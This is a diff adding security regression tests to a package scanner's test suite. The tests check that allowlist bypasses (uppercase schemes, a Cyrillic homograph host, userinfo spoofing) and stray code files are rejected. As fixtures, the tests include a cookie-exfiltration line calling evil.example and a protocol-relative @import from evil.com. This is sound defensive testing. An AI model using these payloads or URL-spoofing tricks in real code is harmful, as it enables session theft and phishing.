@@ -105,4 +105,71 @@ describe("scanPackage", () => {
     const r = scanPackage(p, ctx({ authoringConfig: bad }));
     expect(r.passed).toBe(false);
   });
+
+  // --- Security-review regression tests (bypasses C1/C2/C3/I1/I2 + index.html
+  // audited-reference check + empty-engineChecksums) ---
+
+  it("C1: blocks uppercase-scheme URLs (HTTPS://) that a case-sensitive regex would miss", () => {
+    const p = goodPackage();
+    const bad = { ...goodConfig, title: "HTTPS://evil.com" };
+    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
+    const r = scanPackage(p, ctx({ authoringConfig: bad }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.com/i.test(v.detail))).toBe(true);
+  });
+
+  it("C2: blocks IDN/non-ASCII-host URLs that an ASCII-only host regex would never match at all", () => {
+    const p = goodPackage();
+    // "а" is Cyrillic "а" (U+0430), not Latin "a" (U+0061) — an
+    // ASCII-only capture group fails to match immediately after "://",
+    // which previously caused the ENTIRE url-allowlist rule to find zero
+    // matches for this text (not merely mis-extract the host).
+    const bad = { ...goodConfig, title: "https://аpple.com" };
+    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
+    const r = scanPackage(p, ctx({ authoringConfig: bad }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "url-allowlist" || v.rule === "invalid-url")).toBe(true);
+  });
+
+  it("C3: blocks userinfo-spoofed URLs using the real resolved hostname, not the userinfo", () => {
+    const p = goodPackage();
+    // Looks like "allowed.com" but the userinfo (before @) is not the host —
+    // url.hostname correctly resolves this to "evil.com".
+    const bad = { ...goodConfig, title: "https://allowed.com@evil.com/" };
+    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
+    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["allowed.com"] }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.com/i.test(v.detail))).toBe(true);
+  });
+
+  it("I1: blocks a stray non-checksummed .js file regardless of its content (only audited code may execute)", () => {
+    const p = goodPackage();
+    p.set("content/tracker.js", Buffer.from("fetch('https://evil.example/collect?c='+document.cookie)"));
+    const r = scanPackage(p, ctx());
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "content/tracker.js")).toBe(true);
+  });
+
+  it("I2: blocks a (stray) .css file with a protocol-relative @import", () => {
+    const p = goodPackage();
+    p.set("content/x.css", Buffer.from("@import url(//evil.com/x.css);"));
+    const r = scanPackage(p, ctx());
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "content/x.css")).toBe(true);
+    expect(r.violations.some((v) => v.rule === "forbidden-pattern" && /protocol-relative/i.test(v.detail))).toBe(true);
+  });
+
+  it("blocks index.html referencing a non-checksummed script path (audited-reference rule)", () => {
+    const p = goodPackage();
+    p.set("index.html", Buffer.from('<html><body><script src="content/tracker.js"></script></body></html>'));
+    const r = scanPackage(p, ctx());
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "index.html")).toBe(true);
+  });
+
+  it("blocks an empty (or shrunk) engineChecksums that omits required engine keys", () => {
+    const r = scanPackage(goodPackage(), ctx({ engineChecksums: {} }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "missing-engine-checksum")).toBe(true);
+  });
 });
